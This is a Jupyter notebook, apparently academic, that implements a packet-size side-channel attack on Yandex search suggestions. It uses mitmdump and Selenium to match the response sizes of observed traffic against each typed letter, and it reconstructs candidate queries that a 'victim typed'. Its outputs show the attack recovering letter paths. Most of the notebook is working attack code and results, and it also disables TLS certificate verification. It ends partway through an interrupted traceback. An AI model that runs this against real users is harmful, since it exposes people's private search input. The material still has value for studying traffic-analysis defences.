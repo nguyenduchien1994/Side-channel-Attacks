{
 "cells": [
  {
   "cell_type": "code",
   "execution_count": 20,
   "metadata": {
    "collapsed": false,
    "deletable": true,
    "editable": true
   },
   "outputs": [],
   "source": [
    "from bs4 import BeautifulSoup\n",
    "from struct import *\n",
    "import urllib.request\n",
    "import warnings\n",
    "warnings.filterwarnings('ignore')\n",
    "import pandas as pd\n",
    "import numpy as np\n",
    "import ssl\n",
    "import os\n",
    "import sys\n",
    "import time\n",
    "import threading\n",
    "import re\n",
    "from selenium import webdriver\n",
    "from selenium.webdriver.common.keys import Keys\n",
    "from selenium.webdriver.support.ui import WebDriverWait\n",
    "from selenium.webdriver.support import expected_conditions as EC\n",
    "from selenium.webdriver.common.by import By\n",
    "from selenium.common.exceptions import TimeoutException\n",
    "from subprocess import STDOUT, PIPE, Popen, check_output, check_call, call\n",
    "import socket\n",
    "import netifaces as ni\n",
    "import string\n",
    "\n",
    "\n",
    "global driver\n",
    "\n",
    "# get local ip address\n",
    "ni.ifaddresses('en0')\n",
    "myip = ni.ifaddresses('en0')[2][0]['addr']\n",
    "\n",
    "# get keyword dictionary \n",
    "K=list()\n",
    "with open('keywords.txt','r') as f:\n",
    "    for line in f:\n",
    "        if len(line)>3:\n",
    "            K.append(line[:-1])\n",
    "\n",
    "def terminal(cmd):\n",
    "    os.system(cmd)\n",
    "\n",
    "    \n",
    "\n",
    "def deleteContent(fName):\n",
    "    with open(fName, \"w\") as f:\n",
    "        f.write(\"\");\n",
    "   # time.sleep(2)\n",
    "\n",
    "def readProxyDump(file):\n",
    "    time.sleep(1)\n",
    "    f=open(file,'r')\n",
    "    dump=''.join([line for line in f])\n",
    "    r=re.findall(\"yandex\\.com:443/suggest-spok.+\\s+response.+text/javascript;\\scharset=UTF-8,\\s+(\\d+)b\",dump)\n",
    "    f.close()\n",
    "    return list(map(int,r))    \n",
    "    \n",
    "def enterALetter(letter,inputElement):\n",
    "    deleteContent('sadu123.txt')\n",
    "    time.sleep(0.1)\n",
    "    inputElement.send_keys(letter)\n",
    "    time.sleep(0.1)\n",
    "    T2=readProxyDump('sadu123.txt')\n",
    "    time.sleep(0.1)\n",
    "    return list(map(int,T2))\n",
    "            \n",
    "def enterAWord(wrd,inputElement):\n",
    "   \n",
    "    time.sleep(0.5)\n",
    "    for c in wrd:\n",
    "        inputElement.send_keys(c)\n",
    "        time.sleep(0.3)\n",
    "    time.sleep(0.5)\n",
    "    deleteContent('sadu123.txt')    \n",
    "\n",
    "def enterAllAlphabet(inputElement):\n",
    "    deleteContent('sadu123.txt')\n",
    "    alphabet=list(string.ascii_lowercase)+[' ']\n",
    "    for c in alphabet:\n",
    "        time.sleep(0.1)\n",
    "        inputElement.send_keys(c)\n",
    "        time.sleep(0.1)\n",
    "        inputElement.send_keys(Keys.BACKSPACE)\n",
    "        \n",
    "    time.sleep(0.3)\n",
    "    T2=readProxyDump('sadu123.txt')\n",
    "    return list(map(int,T2))\n",
    "\n",
    "def mitmproxy():\n",
    "    cmd=\"\"\"mitmdump -s 'dumpfile.py yandex\\.com/suggest-spok)' \"\"\"\n",
    "    t=threading.Thread(target=terminal,args=([cmd]))\n",
    "    t.start()\n",
    "    #time.sleep(duration)\n",
    "    time.sleep(1)\n",
    "   # t.stop()\n",
    "    return t\n",
    "\n",
    "def mitmproxySecure():\n",
    "    cmd=\"\"\"mitmdump -s 'fixpackages.py (yandex\\.com/suggest-images|yandex\\.com/suggest-spok)' \"\"\"\n",
    "    t=threading.Thread(target=terminal,args=([cmd]))\n",
    "    t.start()\n",
    "    #time.sleep(duration)\n",
    "    time.sleep(1)\n",
    "   # t.stop()\n",
    "    return t\n",
    "\n",
    "\n",
    "\n",
    "def clearSearch(inputElement):\n",
    "    inputElement.clear()\n",
    "\n",
    "def findMatches(aList,packSize): # find matched packages, return indices\n",
    "    returnList=list()\n",
    "    if (len(aList) != 27):\n",
    "        print(len(aList))\n",
    "        print((aList))\n",
    "        raise ValueError('Your list size less than 27, func:findMatches')\n",
    "    \n",
    "    for i in range(0,len(aList)):\n",
    "        #print(aList[i])\n",
    "        if((packSize >= (aList[i]-2) and (packSize <= (aList[i]+3)))):\n",
    "            returnList.append(i)\n",
    "    return returnList\n",
    "\n",
    "def openYandex():\n",
    "    driver=webdriver.Chrome()\n",
    "    driver.get(\"https://yandex.com\")\n",
    "    time.sleep(2)\n",
    "    inputElement = driver.find_element_by_id(\"text\")\n",
    "    time.sleep(1)\n",
    "    driver_inputelement=list()\n",
    "    driver_inputelement.append(driver)\n",
    "    driver_inputelement.append(inputElement)\n",
    "    return driver_inputelement\n"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 21,
   "metadata": {
    "collapsed": false,
    "deletable": true,
    "editable": true
   },
   "outputs": [
    {
     "data": {
      "text/plain": [
       "0"
      ]
     },
     "execution_count": 21,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "myip\n",
    "\n",
    "len(readProxyDump('sadu123.txt'))"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 22,
   "metadata": {
    "collapsed": false,
    "deletable": true,
    "editable": true
   },
   "outputs": [
    {
     "data": {
      "text/plain": [
       "0"
      ]
     },
     "execution_count": 22,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "deleteContent('sadu123.txt') ## IMPORTANT: IF I TYPE FAST SEQUENCE PROBLEM EXIST\n",
    "call(['echo', 'sadu'])"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 16,
   "metadata": {
    "collapsed": false,
    "deletable": true,
    "editable": true
   },
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "Proxy Starting...\n",
      "Configuring...\n",
      "Proxy Ready\n"
     ]
    }
   ],
   "source": [
    "# assume 10 sec enough to catch userinput \n",
    "tp=mitmproxy() # file name is specified inside dumpfile.py \"sadu123.txt\" for the time being\n",
    "print(\"Proxy Starting...\")\n",
    "print(\"Configuring...\")\n",
    "time.sleep(2)\n",
    "deleteContent('sadu123.txt')\n",
    "print(\"Proxy Ready\")"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "#### Start Secure Proxy"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 147,
   "metadata": {
    "collapsed": false
   },
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "Proxy Starting in Secure Mode...\n",
      "Configuring...\n",
      "Proxy Ready\n"
     ]
    }
   ],
   "source": [
    "tp=mitmproxySecure() # file name is specified inside dumpfile.py \"sadu123.txt\" for the time being\n",
    "print(\"Proxy Starting in Secure Mode...\")\n",
    "print(\"Configuring...\")\n",
    "time.sleep(2)\n",
    "deleteContent('sadu123.txt')\n",
    "print(\"Proxy Ready\")"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 17,
   "metadata": {
    "collapsed": false,
    "deletable": true,
    "editable": true
   },
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "[]\n"
     ]
    }
   ],
   "source": [
    "T=readProxyDump('sadu123.txt') ## IMPORTANT: FOR FIX SIZES NOT WORKING\n",
    "print(T)"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 18,
   "metadata": {
    "collapsed": false,
    "deletable": true,
    "editable": true
   },
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "[]\n"
     ]
    }
   ],
   "source": [
    "deleteContent('sadu123.txt')\n",
    "T=list(map(int,T))\n",
    "print(T)\n",
    "\n"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 23,
   "metadata": {
    "collapsed": false,
    "deletable": true,
    "editable": true
   },
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "[758]\n"
     ]
    }
   ],
   "source": [
    "# PACKAGE SIZES VARY ~2,3 BYTES\n",
    "# 757, ... , 782 -> 757 AND 782 REALLY RARE CASES,\n",
    "# OVERALL 759-2 TO 759 + 3 \n",
    "# LUCKILY IF ONE LETTER CHANGES 1 BYTE, ALL OF THE OTHER LETTERS CHANGE 1 BYTE\n",
    "\n",
    "# OPEN GOOGLE CHROME UP UNTIL A==759\n",
    "deleteContent('sadu123.txt')\n",
    "time.sleep(1)\n",
    "driver_inputelement = []\n",
    "sizeA=[]\n",
    "while(1):\n",
    "    driver_inputelement = openYandex()\n",
    "    inputElement = driver_inputelement[1]\n",
    "    sizeA=enterALetter('a', inputElement )\n",
    "    driver=driver_inputelement[0]\n",
    "    if( sizeA[0] != 759):\n",
    "        print(sizeA)\n",
    "        driver.close()\n",
    "    else:\n",
    "        inputElement.clear()\n",
    "        inputElement.click()\n",
    "        break  \n",
    "\n",
    "inputElement= driver_inputelement[1]"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 11,
   "metadata": {
    "collapsed": false,
    "deletable": true,
    "editable": true,
    "scrolled": false
   },
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "Letter Package Sizes [759, 770, 776, 768, 753, 763, 823, 770, 758, 782, 746, 765, 751, 798, 790, 759, 759, 757, 772, 768, 777, 781, 836, 756, 826, 752, 59]\n",
      "First letter options: b h s \n",
      "\n",
      "CurrentNode:  {'char': 'b', 'parent': 0, 'degree': 1, 'flag': 1}\n",
      "toBeTypedBefore:b\n",
      "next letter options:u \n",
      "Number of added letters: 1\n",
      "\n",
      "CurrentNode:  {'char': 'h', 'parent': 0, 'degree': 1, 'flag': 1}\n",
      "toBeTypedBefore:h\n",
      "next letter options:e \n",
      "Number of added letters: 1\n",
      "\n",
      "CurrentNode:  {'char': 's', 'parent': 0, 'degree': 1, 'flag': 1}\n",
      "toBeTypedBefore:s\n",
      "next letter options:a o x \n",
      "Number of added letters: 3\n",
      "Number of Nodes:5\n",
      "\n",
      "\n",
      "CurrentNode:  {'char': 'u', 'parent': 1, 'degree': 2, 'flag': 1}\n",
      "toBeTypedBefore:bu\n",
      "next letter options:r \n",
      "Number of added letters: 1\n",
      "\n",
      "CurrentNode:  {'char': 'e', 'parent': 2, 'degree': 2, 'flag': 1}\n",
      "toBeTypedBefore:he\n",
      "Next letter does not exist\n",
      "\n",
      "{'char': 'e', 'parent': 2, 'degree': 2, 'flag': 1}-> flag set to 0:\n",
      "\n",
      "CurrentNode:  {'char': 'a', 'parent': 3, 'degree': 2, 'flag': 1}\n",
      "toBeTypedBefore:sa\n",
      "next letter options:  \n",
      "Number of added letters: 1\n",
      "\n",
      "CurrentNode:  {'char': 'o', 'parent': 3, 'degree': 2, 'flag': 1}\n",
      "toBeTypedBefore:so\n",
      "Next letter does not exist\n",
      "\n",
      "{'char': 'o', 'parent': 3, 'degree': 2, 'flag': 1}-> flag set to 0:\n",
      "\n",
      "CurrentNode:  {'char': 'x', 'parent': 3, 'degree': 2, 'flag': 1}\n",
      "toBeTypedBefore:sx\n",
      "Next letter does not exist\n",
      "\n",
      "{'char': 'x', 'parent': 3, 'degree': 2, 'flag': 1}-> flag set to 0:\n",
      "Number of Nodes:2\n",
      "\n",
      "\n",
      "CurrentNode:  {'char': 'r', 'parent': 4, 'degree': 3, 'flag': 1}\n",
      "toBeTypedBefore:bur\n",
      "Next letter does not exist\n",
      "\n",
      "{'char': 'r', 'parent': 4, 'degree': 3, 'flag': 1}-> flag set to 0:\n",
      "\n",
      "CurrentNode:  {'char': ' ', 'parent': 6, 'degree': 3, 'flag': 1}\n",
      "toBeTypedBefore:sa \n",
      "next letter options:l r \n",
      "Number of added letters: 2\n",
      "Number of Nodes:2\n",
      "\n",
      "\n",
      "CurrentNode:  {'char': 'l', 'parent': 10, 'degree': 4, 'flag': 1}\n",
      "toBeTypedBefore:sa l\n",
      "next letter options:o \n",
      "Number of added letters: 1\n",
      "\n",
      "CurrentNode:  {'char': 'r', 'parent': 10, 'degree': 4, 'flag': 1}\n",
      "toBeTypedBefore:sa r\n",
      "next letter options:i u \n",
      "Number of added letters: 2\n",
      "Number of Nodes:3\n",
      "\n"
     ]
    }
   ],
   "source": [
    "tree=[]\n",
    "topofTree={'char':'null', 'parent':-1, 'degree':0, 'flag':1} #flag shows if node is active or removed\n",
    "# topofTree['parent']\n",
    "tree.append(topofTree)\n",
    "#tree[0]['parent']\n",
    "\n",
    "userInput=T\n",
    "userInputSize=len(userInput)\n",
    "i = 0\n",
    "alphabet=list(string.ascii_lowercase)+[' ']\n",
    "\n",
    "#OPEN CHROME w8 for 3 sec\n",
    "currentDegree=0\n",
    "deleteContent('sadu123.txt')  #delete content of the log file\n",
    "\n",
    "while(i<userInputSize):\n",
    "    currentPackSize=userInput[i]\n",
    "    inserted=0 # check if new node inserted or not to increment degree\n",
    "    newNodesOfTree=[] #new Nodes to be inserted into the tree at the end of 26 letter type process\n",
    "    #if first letter, directly type all letters, insert matches\n",
    "    if( i==0 ):\n",
    "        i = i + 1\n",
    "        #inputElement = openYandex() \n",
    "        #deleteContent('sadu123.txt') #delete contents\n",
    "        letterPackSizes = enterAllAlphabet(inputElement) #type 26 letter\n",
    "        print('Letter Package Sizes',end=' ') \n",
    "        print(letterPackSizes)       \n",
    "        \n",
    "        #insert matches to the tree\n",
    "        indices = findMatches(letterPackSizes,userInput[0])\n",
    "        print('First letter options: ',end='')\n",
    "\n",
    "        for x in range(0,len(indices)):\n",
    "            print( alphabet[ indices[x] ],end=' ' )\n",
    "            newNode = {'char':alphabet[indices[x]],'parent':0,'degree':1,'flag':1}\n",
    "            tree.append(newNode)\n",
    "            #print(alphabet[indices[x]])\n",
    "        currentDegree += 1\n",
    "        print('')\n",
    "        continue\n",
    "      \n",
    "    # number of elements that have i degree\n",
    "    rootNum=len([t for t in range(len(tree)) if tree[t]['degree']==currentDegree])\n",
    "\n",
    "    for j in range (rootNum,0,-1):\n",
    "        newNode=tree[len(tree)-j]\n",
    "        #if(newNode['flag']==0) continue # if removed node no need to go on\n",
    "        toBeTypedBefore=[]\n",
    "        currentNode=newNode\n",
    "        print('\\nCurrentNode: ',end=' ')\n",
    "        print(currentNode)\n",
    "        \n",
    "        while( currentNode['parent'] != -1 ):\n",
    "            toBeTypedBefore.append(currentNode['char']) # bottom one inserted\n",
    "            currentNode=tree[currentNode['parent']]\n",
    "        currentNode=newNode\n",
    "        toBeTypedBefore=toBeTypedBefore[::-1]\n",
    "        print(\"toBeTypedBefore:\" + ''.join(toBeTypedBefore))  #type reverse of toBeTypedBefore\n",
    "        \n",
    "        clearSearch(inputElement)  #clear search engine\n",
    "        #time.sleep(10)\n",
    "        enterAWord(toBeTypedBefore,inputElement)        #type toBeType\n",
    "        deleteContent('sadu123.txt') #delete contents\n",
    "        time.sleep(0.1)\n",
    "        letterPackSizes=enterAllAlphabet(inputElement) #type 26 letter after that \n",
    "       # print(\"letterPackSizes\" + repr(letterPackSizes) + \"\\n\")\n",
    "        letterPackSizesTemp = []\n",
    "        \n",
    "        for k in range (0,len(letterPackSizes),2): #remove repetitive package sizes\n",
    "            letterPackSizesTemp.append(letterPackSizes[k])\n",
    "        letterPackSizesDebug = letterPackSizes # this is for debug purposes\n",
    "        letterPackSizes=letterPackSizesTemp\n",
    "       # print('letterTempPackSizes' + repr(letterPackSizes) +'\\n')\n",
    "\n",
    "        indices=findMatches(letterPackSizes,userInput[i]) #find matches\n",
    "        if(len(indices) == 0):\n",
    "            print('Next letter does not exist')\n",
    "        else:  \n",
    "            print('next letter options:',end='')\n",
    "            for x in range(0,len(indices)):\n",
    "                print( alphabet[indices[x]],end=' ')\n",
    "        print('')\n",
    "\n",
    "        tempNode=[]\n",
    "        \n",
    "        if(len(indices)==0): #if there is no match kill that path\n",
    "          # while( currentNode['parent'] != -1 ): #remove recursively\n",
    "            tempNode=tree[currentNode['parent']]\n",
    "            print(repr(currentNode) + '-> flag set to 0:')\n",
    "            index=tree.index(currentNode) #find location of currentnode\n",
    "            tree[index]['flag']=0\n",
    "            currentNode=tempNode\n",
    "        else :#else insert matches to that node\n",
    "        \n",
    "            print('Number of added letters: ' + repr(len(indices)))\n",
    "            if(len(indices) == 26):\n",
    "                print('SORRY ADMIN... NO MORE REDUCTION in this path ')\n",
    "                continue\n",
    "            else:  \n",
    "                inserted=1\n",
    "                for x in range(0,len(indices)):\n",
    "                    newNode={'char':alphabet[indices[x]],'parent':tree.index(currentNode),'degree':(currentDegree+1),'flag':1}\n",
    "                    newNodesOfTree.append(newNode)\n",
    "                    #print(\"newNodesOfTree:\")\n",
    "                    #print(newNodesOfTree)\n",
    "    \n",
    "            \n",
    "   \n",
    "    if(inserted):\n",
    "        currentDegree=currentDegree+1\n",
    "    \n",
    "    print('Number of Nodes:' + repr(len(newNodesOfTree)) +'\\n')\n",
    "    tree=tree+newNodesOfTree\n",
    "    \n",
    "    \n",
    "    \n",
    "    i=i+1 \n",
    "# Print In Reverse Order\n",
    "#s='asd'\n",
    "#s[::-1]"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 107,
   "metadata": {
    "collapsed": false
   },
   "outputs": [
    {
     "data": {
      "text/plain": [
       "[62,\n",
       " 806,\n",
       " 236,\n",
       " 806,\n",
       " 255,\n",
       " 806,\n",
       " 764,\n",
       " 377,\n",
       " 806,\n",
       " 62,\n",
       " 806,\n",
       " 62,\n",
       " 806,\n",
       " 233,\n",
       " 806,\n",
       " 227,\n",
       " 806,\n",
       " 62,\n",
       " 806,\n",
       " 62,\n",
       " 806,\n",
       " 62,\n",
       " 806,\n",
       " 227,\n",
       " 806,\n",
       " 828,\n",
       " 806,\n",
       " 768,\n",
       " 806,\n",
       " 62,\n",
       " 806,\n",
       " 62,\n",
       " 806,\n",
       " 62,\n",
       " 806,\n",
       " 62,\n",
       " 806,\n",
       " 62,\n",
       " 806,\n",
       " 62,\n",
       " 806,\n",
       " 62,\n",
       " 806,\n",
       " 62,\n",
       " 806,\n",
       " 510,\n",
       " 806,\n",
       " 62,\n",
       " 806,\n",
       " 62,\n",
       " 806,\n",
       " 62,\n",
       " 806]"
      ]
     },
     "execution_count": 107,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "#letterPackSizes\n",
    "letterPackSizesDebug\n",
    "#len(letterPackSizesDebug)"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 12,
   "metadata": {
    "collapsed": false,
    "deletable": true,
    "editable": true
   },
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "Path 0\n",
      "{'char': 'h', 'parent': 0, 'degree': 1, 'flag': 1}\n",
      "{'char': 'e', 'parent': 2, 'degree': 2, 'flag': 0}\n",
      "Path 1\n",
      "{'char': 's', 'parent': 0, 'degree': 1, 'flag': 1}\n",
      "{'char': 'o', 'parent': 3, 'degree': 2, 'flag': 0}\n",
      "Path 2\n",
      "{'char': 's', 'parent': 0, 'degree': 1, 'flag': 1}\n",
      "{'char': 'x', 'parent': 3, 'degree': 2, 'flag': 0}\n",
      "Path 3\n",
      "{'char': 'b', 'parent': 0, 'degree': 1, 'flag': 1}\n",
      "{'char': 'u', 'parent': 1, 'degree': 2, 'flag': 1}\n",
      "{'char': 'r', 'parent': 4, 'degree': 3, 'flag': 0}\n",
      "\n",
      "Deciphering...\n",
      "Victim typed...\n",
      "\n",
      "Path 0\n",
      "{'char': 's', 'parent': 0, 'degree': 1, 'flag': 1}\n",
      "{'char': 'a', 'parent': 3, 'degree': 2, 'flag': 1}\n",
      "{'char': ' ', 'parent': 6, 'degree': 3, 'flag': 1}\n",
      "{'char': 'l', 'parent': 10, 'degree': 4, 'flag': 1}\n",
      "{'char': 'o', 'parent': 11, 'degree': 5, 'flag': 1}\n",
      "Path 1\n",
      "{'char': 's', 'parent': 0, 'degree': 1, 'flag': 1}\n",
      "{'char': 'a', 'parent': 3, 'degree': 2, 'flag': 1}\n",
      "{'char': ' ', 'parent': 6, 'degree': 3, 'flag': 1}\n",
      "{'char': 'r', 'parent': 10, 'degree': 4, 'flag': 1}\n",
      "{'char': 'i', 'parent': 12, 'degree': 5, 'flag': 1}\n",
      "Path 2\n",
      "{'char': 's', 'parent': 0, 'degree': 1, 'flag': 1}\n",
      "{'char': 'a', 'parent': 3, 'degree': 2, 'flag': 1}\n",
      "{'char': ' ', 'parent': 6, 'degree': 3, 'flag': 1}\n",
      "{'char': 'r', 'parent': 10, 'degree': 4, 'flag': 1}\n",
      "{'char': 'u', 'parent': 12, 'degree': 5, 'flag': 1}\n"
     ]
    }
   ],
   "source": [
    "tree\n",
    "\n",
    "\n",
    "ix=[t for t in range(len(tree)) if tree[t]['flag']==0]\n",
    "#print(ix)\n",
    "   \n",
    "   \n",
    "for t in range(len(ix)):\n",
    "    print('Path ' + repr(t))\n",
    "    toBePrinted=[]\n",
    "    node=(tree[ix[t]])\n",
    "    while(node['parent'] != -1):\n",
    "        #print(node)\n",
    "        toBePrinted.append(node)\n",
    "        node=tree[node['parent']]\n",
    "    for k in range (len(toBePrinted),0,-1):\n",
    "        print(toBePrinted[k-1])\n",
    "#Final Paths\n",
    "\n",
    "print('\\nDeciphering...')\n",
    "print('Victim typed...\\n')\n",
    "\n",
    "ix=[t for t in range(len(tree)) if tree[t]['degree']==(currentDegree)]\n",
    "\n",
    "# find nodes which satisfy nodes.degree == currentdegree \n",
    "for t in range(len(ix)):\n",
    "    print('Path ' + repr(t))\n",
    "    toBePrinted=[]\n",
    "    node=(tree[ix[t]])\n",
    "    while(node['parent'] != -1):\n",
    "        toBePrinted.append(node)\n",
    "        node=tree[node['parent']]\n",
    "    for k in range (len(toBePrinted),0,-1):\n",
    "        print(toBePrinted[k-1])\n",
    "\n",
    "#indices=findMatches(tree['flag'],lambda x:x==0)\n",
    "#indices\n",
    "#for i in range (0,degree):\n",
    "\n",
    "\n"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {
    "collapsed": true,
    "deletable": true,
    "editable": true
   },
   "outputs": [],
   "source": []
  },
  {
   "cell_type": "code",
   "execution_count": 61,
   "metadata": {
    "collapsed": false,
    "deletable": true,
    "editable": true
   },
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "14.910463809967041\n"
     ]
    }
   ],
   "source": [
    "t=time.time()\n",
    "context = ssl._create_unverified_context()\n",
    "alphabet=list(string.ascii_lowercase)\n",
    "for c in alphabet:\n",
    "    urllib.request.urlopen(\"https://yandex.com/suggest-spok/suggest-ya.cgi?callback=jQuery18307090935306396142_1490678571367&srv=morda_com_desktop&wiz=TrWth&uil=en&fact=1&v=4&icon=1&hl=1&html=1&n=5&bemjson=1&yu=9364118791490678570&pos=1&part=\"+c, context=context)\n",
    "print(time.time()-t)"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 62,
   "metadata": {
    "collapsed": false,
    "deletable": true,
    "editable": true
   },
   "outputs": [
    {
     "ename": "KeyboardInterrupt",
     "evalue": "",
     "output_type": "error",
     "traceback": [
      "\u001b[0;31m---------------------------------------------------------------------------\u001b[0m",
      "\u001b[0;31mKeyboardInterrupt\u001b[0m                         Traceback (most recent call last)",
      "\u001b[0;32m<ipython-input-62-2efb6fa1b27f>\u001b[0m in \u001b[0;36m<module>\u001b[0;34m()\u001b[0m\n\u001b[1;32m      1\u001b[0m \u001b[0;32mwhile\u001b[0m\u001b[0;34m(\u001b[0m\u001b[0;32mTrue\u001b[0m\u001b[0;34m)\u001b[0m\u001b[0;34m:\u001b[0m\u001b[0;34m\u001b[0m\u001b[0m\n\u001b[0;32m----> 2\u001b[0;31m     \u001b[0murllib\u001b[0m\u001b[0;34m.\u001b[0m\u001b[0mrequest\u001b[0m\u001b[0;34m.\u001b[0m\u001b[0murlopen\u001b[0m\u001b[0;34m(\u001b[0m\u001b[0;34m\"https://yandex.com/suggest-spok/suggest-ya.cgi?callback=jQuery18307090935306396142_1490678571367&srv=morda_com_desktop&wiz=TrWth&uil=en&fact=1&v=4&icon=1&hl=1&html=1&n=5&bemjson=1&yu=9364118791490678570&pos=1&part=a\"\u001b[0m\u001b[0;34m,\u001b[0m \u001b[0mcontext\u001b[0m\u001b[0;34m=\u001b[0m\u001b[0mcontext\u001b[0m\u001b[0;34m)\u001b[0m\u001b[0;34m\u001b[0m\u001b[0m\n\u001b[0m",
      "\u001b[0;32m/usr/local/Cellar/python3/3.6.0_1/Frameworks/Python.framework/Versions/3.6/lib/python3.6/urllib/request.py\u001b[0m in \u001b[0;36murlopen\u001b[0;34m(url, data, timeout, cafile, capath, cadefault, context)\u001b[0m\n\u001b[1;32m    221\u001b[0m     \u001b[0;32melse\u001b[0m\u001b[0;34m:\u001b[0m\u001b[0;34m\u001b[0m\u001b[0m\n\u001b[1;32m    222\u001b[0m         \u001b[0mopener\u001b[0m \u001b[0;34m=\u001b[0m \u001b[0m_opener\u001b[0m\u001b[0;34m\u001b[0m\u001b[0m\n\u001b[0;32m--> 223\u001b[0;31m     \u001b[0;32mreturn\u001b[0m \u001b[0mopener\u001b[0m\u001b[0;34m.\u001b[0m\u001b[0mopen\u001b[0m\u001b[0;34m(\u001b[0m\u001b[0murl\u001b[0m\u001b[0;34m,\u001b[0m \u001b[0mdata\u001b[0m\u001b[0;34m,\u001b[0m \u001b[0mtimeout\u001b[0m\u001b[0;34m)\u001b[0m\u001b[0;34m\u001b[0m\u001b[0m\n\u001b[0m\u001b[1;32m    224\u001b[0m \u001b[0;34m\u001b[0m\u001b[0m\n\u001b[1;32m    225\u001b[0m \u001b[0;32mdef\u001b[0m \u001b[0minstall_opener\u001b[0m\u001b[0;34m(\u001b[0m\u001b[0mopener\u001b[0m\u001b[0;34m)\u001b[0m\u001b[0;34m:\u001b[0m\u001b[0;34m\u001b[0m\u001b[0m\n",
      "\u001b[0;32m/usr/local/Cellar/python3/3.6.0_1/Frameworks/Python.framework/Versions/3.6/lib/python3.6/urllib/request.py\u001b[0m in \u001b[0;36mopen\u001b[0;34m(self, fullurl, data, timeout)\u001b[0m\n\u001b[1;32m    524\u001b[0m             \u001b[0mreq\u001b[0m \u001b[0;34m=\u001b[0m \u001b[0mmeth\u001b[0m\u001b[0;34m(\u001b[0m\u001b[0mreq\u001b[0m\u001b[0;34m)\u001b[0m\u001b[0;34m\u001b[0m\u001b[0m\n\u001b[1;32m    525\u001b[0m \u001b[0;34m\u001b[0m\u001b[0m\n\u001b[0;32m--> 526\u001b[0;31m         \u001b[0mresponse\u001b[0m \u001b[0;34m=\u001b[0m \u001b[0mself\u001b[0m\u001b[0;34m.\u001b[0m\u001b[0m_open\u001b[0m\u001b[0;34m(\u001b[0m\u001b[0mreq\u001b[0m\u001b[0;34m,\u001b[0m \u001b[0mdata\u001b[0m\u001b[0;34m)\u001b[0m\u001b[0;34m\u001b[0m\u001b[0m\n\u001b[0m\u001b[1;32m    527\u001b[0m \u001b[0;34m\u001b[0m\u001b[0m\n\u001b[1;32m    528\u001b[0m         \u001b[0;31m# post-process response\u001b[0m\u001b[0;34m\u001b[0m\u001b[0;34m\u001b[0m\u001b[0m\n",
      "\u001b[0;32m/usr/local/Cellar/python3/3.6.0_1/Frameworks/Python.framework/Versions/3.6/lib/python3.6/urllib/request.py\u001b[0m in \u001b[0;36m_open\u001b[0;34m(self, req, data)\u001b[0m\n\u001b[1;32m    542\u001b[0m         \u001b[0mprotocol\u001b[0m \u001b[0;34m=\u001b[0m \u001b[0mreq\u001b[0m\u001b[0;34m.\u001b[0m\u001b[0mtype\u001b[0m\u001b[0;34m\u001b[0m\u001b[0m\n\u001b[1;32m    543\u001b[0m         result = self._call_chain(self.handle_open, protocol, protocol +\n\u001b[0;32m--> 544\u001b[0;31m                                   '_open', req)\n\u001b[0m\u001b[1;32m    545\u001b[0m         \u001b[0;32mif\u001b[0m \u001b[0mresult\u001b[0m\u001b[0;34m:\u001b[0m\u001b[0;34m\u001b[0m\u001b[0m\n\u001b[1;32m    546\u001b[0m             \u001b[0;32mreturn\u001b[0m \u001b[0mresult\u001b[0m\u001b[0;34m\u001b[0m\u001b[0m\n",
      "\u001b[0;32m/usr/local/Cellar/python3/3.6.0_1/Frameworks/Python.framework/Versions/3.6/lib/python3.6/urllib/request.py\u001b[0m in \u001b[0;36m_call_chain\u001b[0;34m(self, chain, kind, meth_name, *args)\u001b[0m\n\u001b[1;32m    502\u001b[0m         \u001b[0;32mfor\u001b[0m \u001b[0mhandler\u001b[0m \u001b[0;32min\u001b[0m \u001b[0mhandlers\u001b[0m\u001b[0;34m:\u001b[0m\u001b[0;34m\u001b[0m\u001b[0m\n\u001b[1;32m    503\u001b[0m             \u001b[0mfunc\u001b[0m \u001b[0;34m=\u001b[0m \u001b[0mgetattr\u001b[0m\u001b[0;34m(\u001b[0m\u001b[0mhandler\u001b[0m\u001b[0;34m,\u001b[0m \u001b[0mmeth_name\u001b[0m\u001b[0;34m)\u001b[0m\u001b[0;34m\u001b[0m\u001b[0m\n\u001b[0;32m--> 504\u001b[0;31m             \u001b[0mresult\u001b[0m \u001b[0;34m=\u001b[0m \u001b[0mfunc\u001b[0m\u001b[0;34m(\u001b[0m\u001b[0;34m*\u001b[0m\u001b[0margs\u001b[0m\u001b[0;34m)\u001b[0m\u001b[0;34m\u001b[0m\u001b[0m\n\u001b[0m\u001b[1;32m    505\u001b[0m             \u001b[0;32mif\u001b[0m \u001b[0mresult\u001b[0m \u001b[0;32mis\u001b[0m \u001b[0;32mnot\u001b[0m \u001b[0;32mNone\u001b[0m\u001b[0;34m:\u001b[0m\u001b[0;34m\u001b[0m\u001b[0m\n\u001b[1;32m    506\u001b[0m                 \u001b[0;32mreturn\u001b[0m \u001b[0mresult\u001b[0m\u001b[0;34m\u001b[0m\u001b[0m\n",
